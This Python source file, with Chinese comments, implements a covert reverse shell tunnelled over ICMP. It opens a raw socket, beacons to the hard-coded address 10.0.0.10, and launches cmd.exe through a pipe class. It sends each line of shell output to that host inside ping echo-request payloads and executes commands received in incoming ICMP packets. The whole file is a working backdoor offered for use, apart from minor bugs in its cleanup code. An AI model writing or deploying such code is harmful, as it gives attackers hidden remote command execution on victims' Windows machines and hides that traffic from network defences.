import socket
import struct
import time
import subprocess  
import sys
import threading

ICMP_ECHO_REQUEST = 8
DATA_LEN = 1024
icmpsocket = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.getprotobyname("icmp"))
addr = ("10.0.0.10",0)

class LoopException(Exception):
    """循环异常自定义异常，此异常并不代表循环每一次都是非正常退出的"""
    def __init__(self,msg="LoopException"):
        self._msg=msg

    def __str__(self):
        return self._msg

class SwPipe():
    """
    与任意子进程通信管道类，可以进行管道交互通信
    """
    def __init__(self,commande,func,exitfunc,readyfunc=None,
        shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,code="GBK"):
        """
        commande 命令
        func 正确输出反馈函数
        exitfunc 异常反馈函数
        readyfunc 当管道创建完毕时调用
        """
        self._thread = threading.Thread(target=self.__run,args=(commande,shell,stdin,stdout,stderr,readyfunc))
        self._code = code
        self._func = func
        self._exitfunc = exitfunc
        self._flag = False
        self._CRFL = "\r\n"

    def __run(self,commande,shell,stdin,stdout,stderr,readyfunc):
        """ 私有函数 """
        try:
            self._process = subprocess.Popen(
                commande,
                shell=shell,
                stdin=stdin,
                stdout=stdout,
                stderr=stderr
                )  
        except OSError as e:
            self._exitfunc(e)
        fun = self._process.stdout.readline
        self._flag = True
        if readyfunc != None:
            threading.Thread(target=readyfunc).start() #准备就绪
        while True:
            line = fun()  
            if not line:  
                break
            try:
                tmp = line.decode(self._code)
            except UnicodeDecodeError:
                tmp =  \
                self._CRFL + "[PIPE_CODE_ERROR] <Code ERROR: UnicodeDecodeError>\n" 
                + "[PIPE_CODE_ERROR] Now code is: " + self._code + self._CRFL
            self._func(self,tmp)

        self._flag = False
        self._exitfunc(LoopException("While Loop break"))   #正常退出


    def write(self,msg):
        if self._flag:
            #请注意一下这里的换行
            self._process.stdin.write((msg + self._CRFL).encode(self._code)) 
            self._process.stdin.flush()
            #sys.stdin.write(msg)#怎么说呢，无法直接用代码发送指令，只能默认的stdin
        else:
            raise LoopException("Shell pipe error from '_flag' not True!")  #还未准备好就退出


    def start(self):
        """ 开始线程 """
        self._thread.start()

    def destroy(self):
        """ 停止并销毁自身 """
        process.stdout.close()
        self._thread.stop()
        del self

#接收到的包是包括ipv4头的，前20 bytes是ip头
def checkSum(packet):
    sum = 0
    countTo = (len(packet)//2)*2
    count = 0
    while count < countTo:
        sum += ((packet[count+1] << 8) | packet[count])
        count += 2

    if countTo < len(packet):
        sum += packet[len(packet) - 1]
        sum = sum & 0xffffffff
    
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def buildPackage(data):
    check_sum = 0
    ID = 0xBB
    packStr = '!BBHHH' + str(DATA_LEN) + 's'
    packet = struct.pack(packStr,ICMP_ECHO_REQUEST,0,check_sum,ID,0,data)
    check_sum = checkSum(packet)
    packet = struct.pack(packStr,ICMP_ECHO_REQUEST,0,check_sum,ID,0,data)
    return packet

def getIcmpData(packet):
    length = len(packet)
    return packet[length - DATA_LEN : length]

def event(cls,line):#输出反馈函数
    sys.stdout.write(line)
    icmpsocket.sendto(buildPackage(line.strip().encode('utf-8','ignore')),addr)
def exit(msg):#退出反馈函数
    print(msg)
def ready():#线程就绪反馈函数
    print("ready!")

def pingT():     
    cotnent = "ol"
    #send online packet
    icmpsocket.sendto(buildPackage(cotnent.encode('utf-8')),addr)
    e = SwPipe("cmd.exe",event,exit,ready)
    e.start()
    time.sleep(1.5)
    while 1:
        raw_packet = icmpsocket.recvfrom(4096)[0]
        data = getIcmpData(raw_packet)
        cotnent = data.decode('utf-8', 'ignore').strip(b'\x00'.decode())
        e.write(cotnent)

if __name__ == "__main__":
    pingT()